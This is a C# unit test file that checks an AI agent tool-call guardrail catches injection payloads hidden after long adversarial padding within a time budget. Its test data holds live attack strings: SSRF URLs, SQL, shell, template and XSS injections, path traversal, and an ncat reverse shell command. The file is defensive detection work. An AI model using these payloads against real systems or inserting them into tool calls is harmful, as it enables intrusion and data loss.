using System.Diagnostics;
using AgentGuard.Core.Abstractions;
using AgentGuard.Core.Rules.ToolCall;
using FluentAssertions;
using Xunit;

namespace AgentGuard.Core.Tests.Rules;

// scans large, adversarially padded arguments on purpose, so it runs in the large-input collection
[Collection("Large inputs")]
public class ToolCallGuardrailRuleLargeInputTests
{
    private static string Repeat(string text, int count) => string.Concat(Enumerable.Repeat(text, count));

    // padding shaped to make each new pattern backtrack, then an injection only that pattern detects
    public static TheoryData<string, string, string> PaddedInjections => new()
    {
        { Repeat("http:", 40_000), " http://127.1/", "Localhost SSRF" },
        { Repeat("a.", 100_000), " localhost:8080", "Localhost SSRF" },
        { Repeat("//a", 60_000), " //0x7f000001/", "Localhost SSRF" },
        { Repeat("' OR ", 40_000), "x' OR 'a'='a", "SQL tautology injection" },
        { Repeat("1 OR ", 40_000), "1 OR 1=1", "SQL tautology injection" },
        { Repeat("'  ", 60_000), "admin'--", "SQL comment injection" },
        { Repeat("$(", 100_000), " $(id)", "Command substitution" },
        { Repeat(";\n", 100_000), "whoami", "Shell command chaining" },
        { Repeat("\n rm x", 50_000), "\nrm -rf /tmp/x", "Shell command chaining" },
        { Repeat("..;", 60_000), "/../../secret", "Directory traversal (../)" },
        { Repeat("%25", 60_000), "%2e%2e%2fsecret", "Encoded directory traversal" },
        { Repeat("{{self ", 30_000), "{{ config.items() }}", "Jinja2/Python template injection" },
        { Repeat("{{a ", 50_000), "{{ config.items() }}", "Jinja2/Python template injection" },
        { Repeat("{{", 100_000), " {{ self.__init__ }}", "Jinja2/Python template injection" },
        { Repeat("${a ", 50_000), "${T(java.lang.Runtime).getRuntime()}", "Server-side template injection" },
        { Repeat("#{", 100_000), " #{7*7}", "Expression language injection" },
        { Repeat("<script ", 30_000), "<script>alert(1)</script>", "Script tag XSS" },
        { Repeat("<svg ", 40_000), "<svg x onfocusin=alert(1)>", "SVG XSS" },
        { Repeat("ncat ", 40_000), "ncat 10.0.0.1 4444 -e /bin/sh", "Reverse shell patterns" },
    };

    [Theory]
    [MemberData(nameof(PaddedInjections))]
    public async Task ShouldDetectWithinBudget_WhenAnInjectionFollowsAdversarialPadding(string padding, string payload, string description)
    {
        var rule = new ToolCallGuardrailRule(new ToolCallGuardrailOptions { Categories = ToolCallInjectionCategory.All });
        var context = new GuardrailContext { Text = "", Phase = GuardrailPhase.Output };
        context.Properties[ToolCallGuardrailRule.ToolCallsKey] = new List<AgentToolCall>
        {
            new() { ToolName = "tool", Arguments = new Dictionary<string, string> { ["value"] = padding + payload } }
        };

        var stopwatch = Stopwatch.StartNew();
        var result = await rule.EvaluateAsync(context);
        stopwatch.Stop();

        result.IsBlocked.Should().BeTrue();
        ((List<ToolCallViolation>)context.Properties[ToolCallGuardrailRule.ViolationsKey]).Single()
            .Description.Should().Be(description);
        stopwatch.Elapsed.Should().BeLessThan(TimeSpan.FromSeconds(2));
    }
}
